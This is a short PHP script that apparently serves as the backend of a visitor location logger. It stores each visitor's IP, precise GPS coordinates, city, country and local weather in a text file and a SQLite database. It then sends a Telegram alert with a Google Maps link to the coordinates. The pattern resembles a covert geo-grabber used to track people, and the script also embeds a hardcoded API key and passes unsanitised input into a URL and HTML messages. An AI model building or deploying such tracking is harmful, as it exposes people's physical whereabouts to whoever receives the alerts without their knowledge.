<?php
include 'telegram_notify.php';

$db = new SQLite3('log.db');
$db->exec("CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT, latitude TEXT, longitude TEXT, city TEXT,
    country TEXT, weather TEXT, timestamp TEXT
)");

$data = json_decode(file_get_contents("php://input"), true);

$ip = $_SERVER['REMOTE_ADDR'];
$lat = $data['lat'] ?? 'N/A';
$lon = $data['lon'] ?? 'N/A';
$city = $data['city'] ?? 'N/A';
$country = $data['country'] ?? 'N/A';
$weather = 'N/A';
$timestamp = date("Y-m-d H:i:s");

if ($lat !== 'N/A' && $lon !== 'N/A') {
    // Weather API
    $weatherKey = "71aec132cf2764d6ea577d3616629a9b";
    $weatherData = file_get_contents("https://api.openweathermap.org/data/2.5/weather?lat=$lat&lon=$lon&appid=$weatherKey&units=metric");
    $weatherJson = json_decode($weatherData, true);
    if (isset($weatherJson['main']['temp'])) {
        $weather = "{$weatherJson['main']['temp']}°C, {$weatherJson['weather'][0]['description']}";
    }
}

// Save log.txt
$log = "IP: $ip | Lat: $lat | Lon: $lon | City: $city | Country: $country | Weather: $weather | Time: $timestamp\n";
file_put_contents('log.txt', $log, FILE_APPEND);

// Save DB
$stmt = $db->prepare("INSERT INTO logs (ip, latitude, longitude, city, country, weather, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)");
$stmt->bindValue(1, $ip);
$stmt->bindValue(2, $lat);
$stmt->bindValue(3, $lon);
$stmt->bindValue(4, $city);
$stmt->bindValue(5, $country);
$stmt->bindValue(6, $weather);
$stmt->bindValue(7, $timestamp);
$stmt->execute();

// Send Telegram Alert
$msg = "🚨 <b>New Visitor</b>\nIP: <code>$ip</code>\n📍 <b>$city, $country</b>\n🌐 https://www.google.com/maps?q=$lat,$lon\n⛅ $weather\n🕒 $timestamp";
sendTelegram($msg);

echo "Logged.";
?>
